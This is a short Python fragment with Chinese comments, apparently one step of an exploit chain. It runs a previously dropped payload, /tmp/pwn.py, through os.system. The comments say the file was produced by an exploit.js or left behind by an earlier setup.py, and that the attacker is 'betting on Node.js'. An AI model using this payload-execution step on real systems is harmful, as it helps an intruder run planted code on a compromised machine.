import os
os.system("python3 /tmp/pwn.py") # 假设 exploit.js 已经跑过生成了 py，或者是之前 setup.py 留下的逻辑
# 为了保险，直接写 Python payload 也可以，但这里我们主要赌 Node.js
